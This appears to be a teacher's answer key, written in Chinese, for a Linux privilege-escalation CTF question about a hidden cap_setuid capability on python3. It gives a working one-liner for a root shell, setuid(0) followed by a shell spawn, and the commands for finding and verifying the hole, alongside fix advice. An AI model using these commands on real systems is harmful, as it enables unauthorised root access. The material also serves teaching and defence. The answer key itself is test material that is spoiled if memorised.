# 第 6 题（教师版）：Capabilities —— 被藏起来的 SUID

> **唯一提权面**：`/usr/bin/python3` 拥有 `cap_setuid+ep`（`getcap` 可见，`find -perm -4000` **不可见**）
> **唯一解**：`python3 -c "import os; os.setuid(0); os.system('/bin/sh')"`
> **已刻意堵死**：`cap_dac_read_search` 等其他可读 flag 的 cap **不授予**；无异常 SUID；无 sudo；`/opt/install-note.txt` 可读但只是线索不是提权面。

## 一、预置环境

| 路径 | 权限/属性 | 说明 |
|---|---|---|
| `/flag.txt` | `root:root 0400` | 构建时生成 |
| `/usr/bin/python3` | `cap_setuid+ep` | **唯一提权面** |
| `/opt/install-note.txt` | `root:root 0644` | 线索：记录着 `setcap` 操作 |
| `/usr/local/bin/probe` | `root:root 0755` | 普通诊断工具，干扰项 |
| `/srv/app/version` | 普通文件 | 场景素材 |

## 二、唯一解

```bash
getcap -r / 2>/dev/null
# /usr/bin/python3 cap_setuid+ep

python3 -c "import os; os.setuid(0); os.system('/bin/sh')"
id          # uid=0(root)
cat /flag.txt
```

等价写法：

```bash
python3 -c 'import os; os.setuid(0); os.execl("/bin/bash","bash","-p")'
```

### 关键点讲解

- **Capability 是“细粒度 SUID”**。`setcap cap_setuid+ep` 的效果 ≈ SUID 位（允许以任意 uid 执行），但不体现在权限位里，所以 `find -perm -4000` 看不到。
- 常用发现命令：
  ```bash
  getcap -r / 2>/dev/null
  ```
- `cap_setuid` 可换身份；`cap_setgid` 换组；`cap_dac_read_search` 绕过文件读权限（只能“读”，不能换身份）；`cap_sys_admin` 几乎等于 root。
- 修复要点：尽量不用 `setcap` 给解释器赋权；需要时用专用小二进制，而不是 `python3`/`perl`/`node` 这类可执行任意代码的解释器。

## 三、为什么只有这一条解

| 思路 | 为什么失败 |
|---|---|
| `find / -perm -4000` 找 SUID | 除系统自带外没有异常 SUID |
| `sudo -l` | player 不在 sudoers |
| 直接读 flag | 0400 root |
| 试 `cap_dac_read_search` 类工具 | 未授予任何 dac 类 cap |

## 四、单解验证

```bash
# 正向
getcap -r / 2>/dev/null | grep setuid
python3 -c 'import os; os.setuid(0); os.system("id; cat /flag.txt")'

# 负向
find / -perm -4000 -type f 2>/dev/null   # 无 /usr/bin/python3
getcap -r / 2>/dev/null | grep -v setuid  # 无其他 cap
sudo -n -l                                # not in sudoers
cat /flag.txt                             # Permission denied
```
